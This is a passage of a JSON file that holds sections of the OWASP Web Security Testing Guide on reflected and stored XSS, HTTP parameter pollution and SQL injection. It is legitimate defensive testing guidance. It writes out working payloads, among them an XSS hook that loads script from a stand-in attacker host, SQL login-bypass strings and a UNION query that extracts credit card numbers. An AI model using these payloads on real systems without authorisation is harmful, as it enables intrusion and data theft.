the pen-tester.</p><p>If source code is available (white-box testing), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.</p>",
        "tools": "<h3>Tools</h3><ul><li>PHP Charset Encoder(PCE)helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.</li><li>Hackvertoris an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).</li><li>XSS-Proxyis an advanced Cross-Site-Scripting (XSS) attack tool.</li><li>ratproxyis a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.</li><li>Burp Proxyis an interactive HTTP/S proxy server for attacking and testing web applications.</li><li>Zed Attack Proxy (ZAP)is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.</li></ul><h3>References</h3><ul><li>XSS Filter Evasion Cheat Sheet</li></ul><ul><li>Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li><li>Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9</li><li>Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3</li></ul><ul><li>CERT - Malicious HTML Tags Embedded in Client Web Requests</li><li>cgisecurity.com - The Cross Site Scripting FAQ</li><li>S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-02": {
        "summary": "<h3>Summary</h3><p>Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.</p><p>Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.</p><p>This vulnerability can be used to conduct a number of browser-based attacks including:</p><ul><li>Hijacking another user’s browser</li><li>Capturing sensitive information viewed by application users</li><li>Pseudo defacement of the application</li><li>Port scanning of internal hosts (“internal” in relation to the users of the web application)</li><li>Directed delivery of browser-based exploits</li><li>Other malicious activities</li></ul><p>Stored XSS does not need a malicious link to be exploited. A successful exploitation occurs when a user visits a page with a stored XSS. The following phases relate to a typical stored XSS attack scenario:</p><ul><li>Attacker stores malicious code into the vulnerable page</li><li>User authenticates in the application</li><li>User visits vulnerable page</li><li>Malicious code is executed by the user’s browser</li></ul><p>This type of attack can also be exploited with browser exploitation frameworks such as BeEF and XSS Proxy . These frameworks allow for complex JavaScript exploit development.</p><p>Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.</p><h3>Test Objectives</h3><ul><li>Identify stored input that is reflected on the client-side.</li><li>Assess the input they accept and the encoding that gets applied on return (if any).</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The process for identifying stored XSS vulnerabilities is similar to the process described during the testing for reflected XSS .</p><p>The first step is to identify all points where user input is stored into the backend and then displayed by the application. Typical examples of stored user input can be found in:</p><ul><li>User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.</li><li>Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later</li><li>File Manager: application that allows upload of files</li><li>Application settings/preferences: application that allows the user to set preferences</li><li>Forum/Message board: application that permits exchange of posts among users</li><li>Blog: if the blog application permits to users submitting comments</li><li>Log: if the application stores some users input into logs.</li></ul><p>Input stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the application receives and stores users input.</p><p>Note : All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.</p><p>Example : Email stored data in index2.php</p><p>Figure 4.7.2-1: Stored Input Example</p><br><p>The HTML code of index2.php where the email value is located:</p><pre><code><input class= \"inputbox\" type= \"text\" name= \"email\" size= \"40\" value= \" [email protected] \" /></code></pre><p>In this case, the tester needs to find a way to inject code outside the <input> tag as below:</p><pre><code><input class= \"inputbox\" type= \"text\" name= \"email\" size= \"40\" value= \" [email protected] \" > MALICIOUS CODE <!-- /></code></pre><p>This involves testing the input validation and filtering controls of the application. Basic injection examples in this case:</p><ul><li>[email protected]&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li><li>[email protected]%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</li></ul><p>Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.</p><p>Figure 4.7.2-2: Stored Input Example</p><br><p>The HTML code following the injection:</p><pre><code><input class= \"inputbox\" type= \"text\" name= \"email\" size= \"40\" value= \" [email protected] \" ><script> alert ( document . cookie ) </script></code></pre><p>The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string “SCRIPT” is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see testing for reflected XSS ) chapter). It is strongly recommended that testers refer to XSS Filter Evasion and Mario XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.</p><p>Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as BeEF and XSS Proxy .</p><p>A typical BeEF exploitation scenario involves:</p><ul><li>Injecting a JavaScript hook which communicates to the attacker’s browser exploitation framework (BeEF)</li><li>Waiting for the application user to view the vulnerable page where the stored input is displayed</li><li>Control the application user’s browser via the BeEF console</li></ul><p>The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.</p><p>Example : BeEF Injection in index2.php :</p><pre><code>[email protected] \"> <script src= https://attackersite/hook.js ></script></code></pre><p>When the user loads the page index2.php , the script hook.js is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.</p><p>Figure 4.7.2-3: Beef Injection Example</p><br><p>This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges.</p><p>If the web application allows file upload, it is important to check if it is possible to upload HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded. The pen-tester should also verify if the file upload allows setting arbitrary MIME types.</p><p>Consider the following HTTP POST request for file upload:</p><pre><code>POST /fileupload.aspx HTTP / 1.1 […] Content-Disposition : form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.txt\" Content-Type : text/plain test</code></pre><p>This design flaw can be exploited in browser MIME mishandling attacks. For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as image/gif can instead be set to text/html . In this case the file will be treated by the client browser as HTML.</p><p>HTTP POST Request forged:</p><pre><code>Content-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.gif\"\nContent-Type: text/html <script> alert ( document . cookie ) </script></code></pre><p>Also consider that Internet Explorer does not handle MIME types in the same way as Mozilla Firefox or other browsers do. For instance, Internet Explorer handles TXT files with HTML content as HTML content. For further information about MIME handling, refer to the whitepapers section at the bottom of this chapter.</p><p>Blind Cross-site Scripting is a form of stored XSS. It generally occurs when the attacker’s payload is saved on the server/infrastructure and later reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application views the attacker’s submission via the backend application, the attacker’s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter .</p><p>Note: Testers should carefully consider the privacy implications of using public or third party services while performing security tests. (See #tools.)</p><p>Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester.</p><p>Depending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the backend system. The following steps are recommended:</p><ul><li>Use frontend application and enter input with special/invalid characters</li><li>Analyze application response(s)</li><li>Identify presence of input validation controls</li><li>Access backend system and check if input is stored and how it is stored</li><li>Analyze source code and understand how stored input is rendered by the application</li></ul><p>If source code is available (as in white-box testing), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests.</p><p>The following table summarizes some special variables and functions to look at when analyzing source code:</p><p>Note : The table above is only a summary of the most important parameters but, all user input parameters should be investigated.</p>",
        "tools": "<h3>Tools</h3><ul><li>PHP Charset Encoder(PCE)helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.</li><li>Hackvertoris an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).</li><li>BeEFis the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.</li><li>XSS-Proxyis an advanced Cross-Site-Scripting (XSS) attack tool.</li><li>Burp Proxyis an interactive HTTP/S proxy server for attacking and testing web applications.</li><li>XSS AssistantGreasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.</li><li>Zed Attack Proxy (ZAP)is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.</li><li>XSS Hunter PortableXSS Hunter finds all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS.</li></ul><h3>References</h3><ul><li>XSS Filter Evasion Cheat Sheet</li></ul><ul><li>Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li><li>Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9</li><li>Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3</li></ul><ul><li>CERT: “CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests”</li><li>Amit Klein: “Cross-site Scripting Explained”</li><li>CGISecurity.com: “The Cross Site Scripting FAQ”</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-03": {
        "summary": "",
        "how-to": "",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-04": {
        "summary": "<h3>Summary</h3><p>HTTP Parameter Pollution tests the applications response to receiving multiple HTTP parameters with the same name; for example, if the parameter username is included in the GET or POST parameters twice.</p><p>Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short HPP ) affects a building block of all web technologies, server and client-side attacks exist.</p><p>Current HTTP standards do not include guidance on how to interpret multiple input parameters with the same name. For instance, RFC 3986 simply defines the term Query String as a series of field-value pairs and RFC 2396 defines classes of reversed and unreserved query string characters. Without a standard in place, web application components handle this edge case in a variety of ways (see the table below for details).</p><p>By itself, this is not necessarily an indication of vulnerability. However, if the developer is not aware of the problem, the presence of duplicated parameters may produce an anomalous behavior in the application that can be potentially exploited by an attacker. As often in security, unexpected behaviors are a usual source of weaknesses that could lead to HTTP Parameter Pollution attacks in this case. To better introduce this class of vulnerabilities and the outcome of HPP attacks, it is interesting to analyze some real-life examples that have been discovered in the past.</p><p>In 2009, immediately after the publication of the first research on HTTP Parameter Pollution, the technique received attention from the security community as a possible way to bypass web application firewalls.</p><p>One of these flaws, affecting ModSecurity SQL Injection Core Rules , represents a perfect example of the impedance mismatch between applications and filters. The ModSecurity filter would correctly apply a deny list for the following string: select 1,2,3 from table , thus blocking this example URL from being processed by the web server: /index.aspx?page=select 1,2,3 from table . However, by exploiting the concatenation of multiple HTTP parameters, an attacker could cause the application server to concatenate the string after the ModSecurity filter already accepted the input. As an example, the URL /index.aspx?page=select 1&page=2,3 from table would not trigger the ModSecurity filter, yet the application layer would concatenate the input back into the full malicious string.</p><p>Another HPP vulnerability turned out to affect Apple Cups , the well-known printing system used by many Unix systems. Exploiting HPP, an attacker could easily trigger a Cross-Site Scripting vulnerability using the following URL: https://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&kerberos . The application validation checkpoint could be bypassed by adding an extra kerberos argument having a valid string (e.g. empty string). As the validation checkpoint would only consider the second occurrence, the first kerberos parameter was not properly sanitized before being used to generate dynamic HTML content. Successful exploitation would result in JavaScript code execution under the context of the hosting site.</p><p>An even more critical HPP vulnerability was discovered in Blogger , the popular blogging platform. The bug allowed malicious users to take ownership of the victim’s blog by using the following HTTP request ( https://www.blogger.com/add-authors.do ):</p><pre><code>POST /add-authors.do HTTP/1.1\n[...]\n\nsecurity_token=attackertoken & blogID=attackerblogidvalue & blogID=victimblogidvalue & authorsList=goldshlager19test%40gmail.com(attacker email) & ok=Invite</code></pre><p>The flaw resided in the authentication mechanism used by the web application, as the security check was performed on the first blogID parameter, whereas the actual operation used the second occurrence.</p><p>The following table illustrates how different web technologies behave in presence of multiple occurrences of the same HTTP parameter.</p><p>Given the URL and querystring: https://example.com/?color=red&color=blue</p><p>(Source: Appsec EU 2009 Carettoni & Paola)</p><h3>Test Objectives</h3><ul><li>Identify the backend and the parsing method used.</li><li>Assess injection points and try bypassing input filters using HPP.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Luckily, because the assignment of HTTP parameters is typically handled via the web application server, and not the application code itself, testing the response to parameter pollution should be standard across all pages and actions. However, as in-depth business logic knowledge is necessary, testing HPP requires manual testing. Automatic tools can only partially assist auditors as they tend to generate too many false positives. In addition, HPP can manifest itself in client-side and server-side components.</p><p>To test for HPP vulnerabilities, identify any form or action that allows user-supplied input. Query string parameters in HTTP GET requests are easy to tweak in the navigation bar of the browser. If the form action submits data via POST, the tester will need to use an intercepting proxy to tamper with the POST data as it is sent to the server. Having identified a particular input parameter to test, one can edit the GET or POST data by intercepting the request, or change the query string after the response page loads. To test for HPP vulnerabilities simply append the same parameter to the GET or POST data but with a different value assigned.</p><p>For example: if testing the search_string parameter in the query string, the request URL would include that parameter name and value:</p><pre><code>https://example.com/?search_string=kittens</code></pre><p>The particular parameter might be hidden among several other parameters, but the approach is the same; leave the other parameters in place and append the duplicate:</p><pre><code>https://example.com/?mode=guest&search_string=kittens&num_results=100</code></pre><p>Append the same parameter with a different value:</p><pre><code>https://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies</code></pre><p>and submit the new request.</p><p>Analyze the response page to determine which value(s) were parsed. In the above example, the search results may show kittens , puppies , some combination of both ( kittens,puppies or kittens~puppies or ['kittens','puppies'] ), may give an empty result, or error page.</p><p>This behavior, whether using the first, last, or combination of input parameters with the same name, is very likely to be consistent across the entire application. Whether or not this default behavior reveals a potential vulnerability depends on the specific input validation and filtering specific to a particular application. As a general rule: if existing input validation and other security mechanisms are sufficient on single inputs, and if the server assigns only the first or last polluted parameters, then parameter pollution does not reveal a vulnerability. If the duplicate parameters are concatenated, different web application components use different occurrences or testing generates an error, there is an increased likelihood of being able to use parameter pollution to trigger security vulnerabilities.</p><p>A more in-depth analysis would require three HTTP requests for each HTTP parameter:</p><p>Crafting a full exploit from a parameter pollution weakness is beyond the scope of this text. See the references for examples and details.</p><p>Similarly to server-side HPP, manual testing is the only reliable technique to audit web applications in order to detect parameter pollution vulnerabilities affecting client-side components. While in the server-side variant the attacker leverages a vulnerable web application to access protected data or to perform actions that are either not permitted or not supposed to be executed, client-side attacks aim at subverting client-side components and technologies.</p><p>To test for HPP client-side vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user. A search page is ideal, but a login box might not work (as it might not show an invalid username back to the user).</p><p>Similarly to server-side HPP, pollute each HTTP parameter with %26HPP_TEST and look for url-decoded occurrences of the user-supplied payload:</p><ul><li>&HPP_TEST</li><li>&amp;HPP_TEST</li><li>etc.</li></ul><p>In particular, pay attention to responses having HPP vectors within data , src , href attributes or forms actions. Again, whether or not this default behavior reveals a potential vulnerability depends on the specific input validation, filtering and application business logic. In addition, it is important to notice that this vulnerability can also affect query string parameters used in XMLHttpRequest (XHR), runtime attribute creation and other plugin technologies (e.g. Adobe Flash’s flashvars variables).</p>",
        "tools": "<h3>Tools</h3><ul><li>ZAP Passive/Active Scanners</li></ul><h3>References</h3><ul><li>HTTP Parameter Pollution - Luca Carettoni, Stefano di Paola</li><li>Client-side HTTP Parameter Pollution Example (Yahoo! Classic Mail flaw) - Stefano di Paola</li><li>How to Detect HTTP Parameter Pollution Attacks - Chrysostomos Daniel</li><li>CAPEC-460: HTTP Parameter Pollution (HPP) - Evgeny Lebanidze</li><li>Automated Discovery of Parameter Pollution Vulnerabilities in Web Applications - Marco Balduzzi, Carmen Torrano Gimenez, Davide Balzarotti, Engin Kirda</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INPV-05": {
        "summary": "<h3>Summary</h3><p>SQL injection testing checks if it is possible to inject data into an application/site so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. Successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database, which if you didn’t know already is quite bad.</p><p>An SQL injection attack consists of insertion or “injection” of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.</p><p>In general, the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:</p><p>select title, text from news where id=$id</p><p>In the example above the variable $id contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.</p><p>Because of the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user’s choice. The example below illustrates the user-supplied data “10 or 1=1”, changing the logic of the SQL statement, modifying the WHERE clause adding a condition “or 1=1”.</p><p>select title, text from news where id=10 or 1=1</p><p>NOTE: Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you’re injecting into, it’s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.</p><p>SQL Injection attacks can be divided into the following three classes:</p><ul><li>Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward attack, in which the retrieved data is presented directly in the application web page.</li><li>Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).</li><li>Inferential or Blind: there is no actual transfer of data. Still, the tester can reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.</li></ul><p>A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.</p><p>About the techniques to exploit SQL injection flaws, there are five common techniques. Also, those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):</p><ul><li>Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.</li><li>Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.</li><li>Error-based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.</li><li>Out-of-band: the technique used to retrieve data using a different channel (e.g., make an HTTP connection to send the results to a web server).</li><li>Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when the attacker doesn’t have some answer (result, output, or error) from the application.</li></ul><h3>Test Objectives</h3><ul><li>Identify SQL injection points.</li><li>Assess the severity of the injection and the level of access that can be achieved through it.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>The first step in this test is to understand when the application interacts with a DB Server to access some data. Typical examples of cases, when an application needs to talk to a DB, include:</p><ul><li>Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).</li><li>Search engines: the string submitted by the user could be used in an SQL query that extracts all relevant records from a database.</li><li>E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.</li></ul><p>The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests, and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.</p><p>The very first test usually consists of adding a single quote ' or a semicolon ; to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):</p><pre><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e14'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the\ncharacter string ''.\n/target/target.asp, line 113</code></pre><p>Also comment delimiters ( -- or /* */ , etc) and other SQL keywords like AND and OR can be used to try to modify the query. A very simple but sometimes still effective technique is simply to insert a string where a number is expected, as an error like the following might be generated:</p><pre><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e07'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the\nvarchar value 'test' to a column of data type int.\n/target/target.asp, line 113</code></pre><p>Monitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester to mount a successful injection attack. However, applications often do not provide so much detail: a simple ‘500 Server Error’ or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the others remain constant, in order to precisely understand which parameters are vulnerable and which are not.</p><p>Consider the following SQL query:</p><p>SELECT * FROM Users WHERE Username='$username' AND Password='$password'</p><p>A similar query is generally used from the web application to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to log-in to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:</p><p>$username = 1' or '1' = '1</p><p>$password = 1' or '1' = '1</p><p>The query will be:</p><p>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'</p><p>NOTE: Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you’re injecting into, it’s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.</p><p>If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable site is www.example.com , the request that we’ll carry out will be:</p><p>https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1</p><p>After a short analysis, we notice that the query returns a value (or a set of values) because the condition is always true ( OR 1=1 ). In this way, the system has authenticated the user without knowing the username and password.</p><p>Note: In some systems, the first row of a user table would be an administrator user. This may be the profile returned in some cases.</p><p>Another example query is the following:</p><p>SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))</p><p>In this case, there are two problems, one due to the use of the parentheses and one due to the use of the MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding some closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such a symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol for the greater majority of databases is /* . In Oracle, the symbol is -- . This said the values that we’ll use as Username and Password are:</p><p>$username = 1' or '1' = '1'))/*</p><p>$password = foo</p><p>In this way, we’ll get the following query:</p><p>SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))</p><p>(Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.)</p><p>The request URL will be:</p><p>https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo</p><p>This may return some values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). To get around this problem, it is enough to insert an SQL command that imposes a condition that the number of the returned results must be one (one record returned). To reach this goal, we use the operator LIMIT <num> , where <num> is the number of the results/records that we want to be returned. Concerning the previous example, the value of the fields Username and Password will be modified as follows:</p><p>$username = 1' or '1' = '1')) LIMIT 1/*</p><p>$password = foo</p><p>In this way, we create a request like the following:</p><p>https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo</p><p>Consider the following SQL query:</p><p>SELECT * FROM products WHERE id_product=$id_product</p><p>Consider also the request to a script that executes the query above:</p><p>https://www.example.com/product.php?id=10</p><p>When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is to play with logic, using the operators AND and OR.</p><p>Consider the request:</p><p>https://www.example.com/product.php?id=10 AND 1=2</p><p>SELECT * FROM products WHERE id_product=10 AND 1=2</p><p>In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:</p><p>https://www.example.com/product.php?id=10 AND 1=1</p><p>Depending on the API that the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.</p><p>Consider the following SQL query:</p><p>SELECT * FROM products WHERE id_product=$id_product</p><p>A way to exploit the above scenario would be:</p><p>https://www.example.com/product.php?id=10; INSERT INTO users (…)</p><p>This way is possible to execute many queries in a row and independent of the first query.</p><p>Even though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, and functions to retrieve data such as users’ names and databases, features, comments lines, etc.</p><p>When the testers move to a more advanced SQL injection exploitation they need to know what the backend database is.</p><p>The first way to find out what backend database is used is by observing the error returned by the application. The following are some examples of error messages:</p><p>MySql:</p><pre><code>You have an error in your SQL syntax; check the manual\nthat corresponds to your MySQL server version for the\nright syntax to use near '\\'' at line 1</code></pre><p>One complete UNION SELECT with version() can also help to know the backend database.</p><p>SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1</p><p>Oracle:</p><p>ORA-00933: SQL command not properly ended</p><p>MS SQL Server:</p><pre><code>Microsoft SQL Native Client error ‘80040e14’\nUnclosed quotation mark after the character string\n\nSELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1</code></pre><p>PostgreSQL:</p><pre><code>Query failed: ERROR: syntax error at or near\n\"’\" at character 56 in /www/site/test.php on line 121.</code></pre><p>If there is no error message or a custom error message, the tester can try to inject it into string fields using varying concatenation techniques:</p><ul><li>MySql: ‘test’ + ‘ing’</li><li>SQL Server: ‘test’ ‘ing’</li><li>Oracle: ‘test’’ing’</li><li>PostgreSQL: ‘test’’ing’</li></ul><p>The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose, for our example, that the query executed from the server is the following:</p><p>SELECT Name, Phone, Address FROM Users WHERE Id=$id</p><p>We will set the following $id value:</p><p>$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</p><p>We will have the following query:</p><p>SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</p><p>Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword ALL is necessary to get around queries that use the keyword DISTINCT . Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns to avoid a syntax error.</p><p>The first detail a tester needs to find to exploit the SQL injection vulnerability using this technique is the right number of columns in the SELECT statement.</p><p>To achieve this, the tester can use the ORDER BY clause followed by a number indicating the numeration of the database’s column selected:</p><p>https://www.example.com/product.php?id=10 ORDER BY 10--</p><p>If the query executes with success, the tester can assume in this example that there are 10 or more columns in the SELECT statement. If the query fails, then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:</p><p>Unknown column '10' in 'order clause'</p><p>After the tester finds out the number of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:</p><p>https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--</p><p>If the query fails, the tester will probably see a message like:</p><p>All cells in a column must have the same datatype</p><p>If the query executes with success, the first column can be an integer. Then the tester can move further and so on:</p><p>https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--</p><p>After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a LIMIT clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database that has an ID that equals 99999):</p><p>https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--</p><p>It’s best when you can exploit a SQL injection with the union technique because you can retrieve the result of your query in one request. But most of the SQL injections in the wild are blind. Yet, you can turn some of them into union-based injections.</p><br><p>Identification Either of the following methods can be used to identify these SQL injections:</p><br><p>Root Cause The reason you can’t use the usual Union techniques is the complexity of the vulnerable query. In the Union Technique, you comment on the rest of the query after your UNION payload. It’s fine for normal queries, but in more complicated queries it can be problematic. If the first part of the query depends on the second part of it, commenting on the rest of it breaks the original query.</p><br><p>Scenario 1 The vulnerable query is a sub-query, and the parent query handles returning the data.</p><br><pre><code>SELECT \n  * \nFROM \n  customers \nWHERE \n  id IN (                 --\\\n    SELECT                   |\n      DISTINCT customer_id   |\n    FROM                     |\n      orders                 |--> vulnerable query\n    WHERE                    |\n      cost > 200             |\n  );                      --/</code></pre><ul><li>Problem:If you inject aUNIONpayload, it doesn’t affect the returned data. 